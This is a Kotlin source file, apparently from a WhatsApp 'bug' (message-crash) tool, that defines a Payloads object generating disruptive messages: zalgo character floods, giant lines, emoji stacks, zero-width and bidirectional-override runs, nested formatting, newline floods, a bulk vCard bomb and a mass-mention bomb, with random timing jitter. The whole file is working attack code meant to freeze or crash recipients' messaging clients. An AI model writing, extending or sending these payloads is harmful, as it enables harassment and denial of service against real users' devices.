package id.spectre.bugs.bug

import kotlin.random.Random

object Payloads {

    private val UP = (0x0300..0x0314).toList() +
            (0x033D..0x0344).toList() + (0x0346..0x034E).toList() + (0x0350..0x036F).toList()
    private val DOWN = (0x0316..0x031D).toList() + (0x0330..0x0334).toList()
    private val MID = (0x0334..0x0338).toList() + (0x035C..0x0362).toList()

    private val EMOJI = listOf(
        "\uD83D\uDD25", "\uD83D\uDCA5", "\u26A1", "\uD83D\uDCA3", "\uD83E\uDD2F",
        "\uD83D\uDE31", "\uD83D\uDC80", "\uD83C\uDF1A", "\uD83D\uDD2E", "\uD83E\uDDE8"
    )

    fun hugeLine(chars: Int): String = buildString(chars) {
        val pool = "SPECTRE0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        repeat(chars) { append(pool[it % pool.length]) }
    }

    fun zalgo(base: String, depth: Int): String = buildString {
        for (ch in base) {
            append(ch)
            repeat(depth) {
                when (Random.nextInt(3)) {
                    0 -> append(UP.random())
                    1 -> append(DOWN.random())
                    else -> append(MID.random())
                }
            }
        }
    }

    fun emojiStack(count: Int): String = buildString(count * 2) {
        repeat(count) { append(EMOJI[it % EMOJI.size]) }
    }

    fun invisible(count: Int): String = buildString(count) {
        val pool = charArrayOf('\u200B', '\u200C', '\u200D', '\uFEFF', '\u2060')
        repeat(count) { append(pool[it % pool.size]) }
    }

    fun bidi(count: Int): String = buildString(count * 2) {
        val pool = charArrayOf(
            '\u202A', '\u202B', '\u202C', '\u202D', '\u202E',
            '\u2066', '\u2067', '\u2068', '\u2069'
        )
        repeat(count) {
            append(pool[it % pool.size])
            append("\u0627")
        }
    }

    fun fmtNest(count: Int): String = buildString(count * 3) {
        repeat(count) {
            append(
                when (it % 4) {
                    0 -> "*_"
                    1 -> "~```"
                    2 -> "_*"
                    else -> "```~"
                }
            )
        }
    }

    fun newlineCanyon(count: Int): String = "\n".repeat(count)

    fun vcardBomb(count: Int): String = buildString {
        repeat(count) { i ->
            append("BEGIN:VCARD\nVERSION:3.0\nFN:SPECTRE $i\n")
            append("TEL;type=CELL:+62812${10000000 + i}\nEND:VCARD\n")
        }
    }

    fun mentionBomb(text: String, jids: List<String>): Pair<String, List<String>> {
        val body = buildString {
            append(text)
            repeat(6) { append("\n") }
            jids.forEach { append("@${it.substringBefore('@')} ") }
        }
        return body to jids
    }

    fun jitter(min: Long, max: Long): Long = Random.nextLong(min, max)
}
